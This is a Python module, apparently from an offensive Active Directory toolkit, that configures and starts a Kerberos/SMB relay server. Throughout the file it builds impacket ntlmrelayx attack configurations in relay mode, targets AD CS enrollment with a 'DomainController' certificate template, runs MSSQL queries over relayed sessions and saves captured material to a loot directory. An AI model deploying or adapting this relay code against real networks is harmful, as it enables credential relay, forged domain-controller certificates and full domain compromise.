from __future__ import annotations

import os
from typing import Optional
from urllib.parse import urlparse

from lib.protocols.kerberos.krb_relay.clients import PROTOCOL_CLIENTS
from lib.protocols.kerberos.krb_relay.config import KrbRelayxConfig
from lib.protocols.kerberos.krb_relay.native_runner import (
    build_native_relay_config,
    native_relay_available,
    pysmb_available,
    start_native_relay,
)
from lib.protocols.kerberos.krb_relay.servers.smbrelayserver import SMBRelayServer


def relay_stack_available(relay_target: str) -> bool:
    if native_relay_available(relay_target):
        return True
    try:
        from lib.protocols.smb.smb_exec import impacket_available

        return impacket_available()
    except Exception:
        return False


def start_relay_server(
    relay_target: str,
    listener_ip: str,
    lootdir: str = ".",
    adcs_template: str = "DomainController",
    mssql_queries: Optional[list] = None,
    dc_ip: Optional[str] = None,
    relay_port: int = 445,
):
    if native_relay_available(relay_target):
        config = build_native_relay_config(
            relay_target=relay_target,
            listener_ip=listener_ip,
            lootdir=lootdir,
            adcs_template=adcs_template,
            mssql_queries=mssql_queries,
            port=relay_port,
        )
        return ("native", start_native_relay(config))

    from lib.protocols.smb.smb_exec import impacket_available

    if not impacket_available():
        raise ImportError(
            "impacket is required for legacy relay targets; "
            "AD CS and MSSQL relay work natively without impacket"
        )
    config = build_relay_config(
        relay_target=relay_target,
        listener_ip=listener_ip,
        lootdir=lootdir,
        adcs_template=adcs_template,
        mssql_queries=mssql_queries,
        dc_ip=dc_ip,
    )
    return ("impacket", start_smb_relay_server(config))


def _relay_hostname(relay_target: str) -> str:
    return urlparse(relay_target).hostname or ""


def build_relay_config(
    relay_target: str,
    listener_ip: str,
    lootdir: str = ".",
    adcs_template: str = "DomainController",
    mssql_queries: Optional[list] = None,
    dc_ip: Optional[str] = None,
) -> KrbRelayxConfig:
    from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
    from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor

    hostname = _relay_hostname(relay_target)
    if not hostname:
        raise ValueError(f"invalid relay target URL: {relay_target}")

    os.makedirs(lootdir or ".", exist_ok=True)

    config = KrbRelayxConfig()
    config.setProtocolClients(PROTOCOL_CLIENTS)
    config.setTargets(TargetsProcessor(singleTarget=relay_target, protocolClients=PROTOCOL_CLIENTS))
    config.setMode("RELAY")
    config.setAttacks(PROTOCOL_ATTACKS)
    config.setLootdir(lootdir)
    config.setSMB2Support(True)
    config.setInterfaceIp(listener_ip)
    config.setIsADCSAttack("certsrv" in relay_target.lower())
    config.setADCSOptions(adcs_template)
    config.setIPv6(False)
    config.setWpadOptions(None, None)
    config.setEncoding("utf-8")
    config.setExeFile(None)
    config.setCommand(None)
    config.setEnumLocalAdmins(False)
    config.setLDAPOptions(False, False, False, False, None, None, False, False, False, False, False)
    config.setKrbOptions("ccache", hostname.split(".")[0].upper() + "$")
    config.setAuthOptions(None, None, dc_ip, None, None, False)
    config.setMSSQLOptions(mssql_queries or [])
    config.setInteractive(False)
    config.dcip = dc_ip
    return config


def start_smb_relay_server(config: KrbRelayxConfig) -> SMBRelayServer:
    server = SMBRelayServer(config)
    server.start()
    return server
